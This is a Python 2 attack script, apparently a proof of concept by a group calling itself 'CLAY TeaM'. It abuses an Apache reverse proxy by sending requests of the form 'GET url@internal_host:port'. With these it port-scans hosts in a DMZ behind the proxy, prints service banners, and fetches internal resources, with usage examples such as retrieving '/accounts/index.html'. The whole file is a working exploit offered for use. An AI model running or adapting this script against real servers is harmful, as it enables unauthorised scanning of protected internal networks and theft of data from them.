#!/usr/bin/env python

###########################
#    Copyrights Please    #
###########################

###########################
#    My Original Code     #
###########################
# WhoAmi : 
#https://www.facebook.com/Gods.nd.kings
#https://www.facebook.com/clayteamwhoami


#############################
#         LIBRARIES         #
#############################
import socket
import string
import getopt, sys

#############################
#         	CONFIG          #
#############################
known_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]

#############################
#         FUNCTIONS         #
#############################
def send_request(url, apache_target, apache_port, internal_target, internal_port, resource):

	get = "GET " + url + "@" + internal_target + ":" + internal_port +  "/" + resource + " HTTP/1.1\r\n"
	get = get + "Host: " + apache_target + "\r\n\r\n"
	
	remoteserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	remoteserver.settimeout(3)

	try:
		remoteserver.connect((apache_target, int(apache_port)))
		remoteserver.send(get)
		return remoteserver.recv(4096)
	except:
		return ""

def get_banner(result):
	return result[string.find(result, "\r\n\r\n")+4:]


def scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource):

	print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource)
	for port in tested_ports:
		port = str(port)
		result = send_request(url, apache_target, apache_port, internal_target, port, resource)
		if string.find(result,"HTTP/1.1 200")!=-1 or \
		string.find(result,"HTTP/1.1 30")!=-1 or \
		string.find(result,"HTTP/1.1 502")!=-1:
			print "- Open port: " + port + "/TCP"
			print get_banner(result)
		elif len(result)==0:
	 		print "- Filtered port: " + port + "/TCP"
		else:
	 		print "- Closed port: " + port + "/TCP"
			
####################
#      Usage       #
####################
def usage():

	print
	print "======================================="
	print "   proof of concept Of Vuln Apache     "
	print "   Coder : WhoAmi                      "
	print "   Group Name : CLAY TeaM              "
	print "   Location : Tunisia                  "
	print "======================================="
	print
	print "usage():"
	print "python apache_scan.py [options]"
	print
	print " [options]"
	print "		-r: Remote Apache host"
	print "		-p: Remote Apache port (default is 80)"
	print "		-u: URL on the remote web server (default is /)"
	print "		-d: Host in the DMZ (default is 127.0.0.1)"
	print "		-e: Port in the DMZ (enables 'single port scan')"
	print "		-g: GET request to the host in the DMZ (default is /)"
	print "		-h: Help page"
	print
	print "examples:"
	print " - Port scan of the remote host"
	print "		python apache_scan.py -r www.example.com -u /images/test.gif"
	print " - Port scan of a host in the DMZ"
	print "		python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local"
	print " - Retrieve a resource from a host in the DMZ"
	print "		python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local -e 80 -g /accounts/index.html"
	print

####################
#      Banner      #
####################
def print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource):
	print
	print "======================================="
	print "   proof of concept Of Vuln Apache     "
	print "   Coder : WhoAmi                      "
	print "   Group Name : CLAY TeaM              "
	print "   Location : Tunisia                  "
	print "======================================="
	print
	print " [+] Target: " + apache_target
	print " [+] Target port: " + apache_port
	print " [+] Internal host: " + internal_target
	print " [+] Tested ports: " + str(tested_ports)
	print " [+] Internal resource: " + resource
	print

#############################
#         	 MAIN           #
#############################
def main():

	global apache_target
	global apache_port
	global url
	global internal_target
	global internal_port
	global resource

	try:
		opts, args = getopt.getopt(sys.argv[1:], "u:r:p:d:e:g:h", ["help"])
	except getopt.GetoptError:
		usage()
		sys.exit(2)

	try:
		for o, a in opts:
			if o in ("-h", "--help"):
				usage()
				sys.exit(2)
			if o == "-u":
				url=a
			if o == "-r":
				apache_target=a
			if o == "-p":
				apache_port=a
			if o == "-d":
				internal_target = a
			if o == "-e":
				internal_port=a
			if o == "-g":
				resource=a				
		
	except getopt.GetoptError:
		usage()
		sys.exit(2)
		
	if apache_target == "":
		usage()
		sys.exit(2)


url = "/"
apache_target = ""
apache_port = "80"
internal_target = "127.0.0.1"
internal_port = ""
resource = "/"

main()

if internal_port!="":
	tested_ports = [internal_port]
else:
	tested_ports = known_ports

scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource)
